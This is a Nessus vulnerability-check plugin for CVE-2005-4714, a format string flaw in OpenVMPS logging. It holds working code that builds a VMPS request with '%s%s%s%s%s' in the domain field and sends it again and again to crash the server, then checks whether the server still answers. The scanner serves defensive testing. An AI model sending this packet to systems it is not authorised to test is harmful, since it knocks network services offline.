#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote host is running a service that is affected by a format
string vulnerability. 

Description :

The remote host appears to be running OpenVMPS, an open-source VLAN
Management Policy Server (VMPS). 

There is a format string vulnerability in versions of OpenVMPS up to
and including 1.3 that may allow remote attackers to crash the server
or execute code on the affected host subject to the privileges under
which the server operates, possibly root. 

See also :

http://mazahaquer.h0nest.org/PRIVOXY-FORCE/adv/0x6D48-001-openvmps.txt

Solution :

Use a firewall to filter access to the affected port.

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20067);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-4714");
  script_bugtraq_id(15072);

  script_name(english:"OpenVMPS Logging Format String Vulnerability");
  script_summary(english:"Checks for a format string vulnerability in OpenVMPS' logging");

  script_description(english:desc);

  script_category(ACT_DENIAL);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_require_ports("Services/vmps", 1589);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");


port = get_kb_item("Services/vmps");
if (!port) port = 1589;
if (!get_udp_port_state(port)) exit(0);


# Use a random domain to ensure we get a "WRONG DOMAIN" response.
domain = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_", length:10);
# Use a random sequence number to verify the response packet.
seq = rand_str(length:4);
# A request to join a port.
req = raw_string(
  0x01, 0x01, 0x00, 0x06, seq,

  0x00, 0x00, 0x0c, 0x01, 0x00, 0x04, 0x7f, 0x00, 0x00, 0x01,
  0x00, 0x00, 0x0c, 0x02, 0x00, 0x06, "nessus",
  0x00, 0x00, 0x0c, 0x03, 0x00, strlen(SCRIPT_NAME), SCRIPT_NAME,
  0x00, 0x00, 0x0c, 0x04, 0x00, strlen(domain), domain,
  0x00, 0x00, 0x0c, 0x07, 0x00, 0x01, 0x00,
  0x00, 0x00, 0x0c, 0x06, 0x00, 0x06, 0x12, 0x34, 0x12, 0x34, 0x12, 0x34
);


# Try a couple of times to get a response out of the server.
for (iter1 = 0; iter1 < 5; iter1++) {
  soc = open_sock_udp(port);
  if (!soc) exit(0);

  # Make sure the server's up by sending a request to join a port.
  send(socket:soc, data:req);

  # Read the response.
  res = recv(socket:soc, length:16);
  if (isnull(res)) exit(0);

  # If it looks like it's up...
  if (
    ord(res[0]) == 1 &&
    ord(res[1]) == 2 &&
    ord(res[2]) == 5 &&
    substr(res, 4, 7) == seq
  ) {
    # Craft a malicious packet to exploit the flaw.
    req2 = str_replace(
      string:req, 
      find:domain,
      replace:"%s%s%s%s%s"
    );

    # Try a couple of times to crash the server.
    for (iter2 = 0; iter2 < 5; iter2++) {
      soc = open_sock_udp(port);
      if (!soc) exit(0);

      send(socket:soc, data:req2);

      # Read the response.
      res = recv(socket:soc, length:16);

      # If there was no response, check again to make sure it's down.
      if (isnull(res)) {
        for (iter3 = 0; iter3 < 5; iter3++) {
          soc = open_sock_udp(port);
          #if (!soc) exit(0);

          # Make sure the server's up by sending a valid request.
          send(socket:soc, data:req);

          # Read the response.
          res = recv(socket:soc, length:16);

          # There's a problem if we no longer get a response to a valid request.
          if (isnull(res)) {
            security_warning(port:port, protocol:"udp", data:desc);
            exit(0);
          }
        }
      }
    }

    # We're done if the server responded.
    break;
  }
}
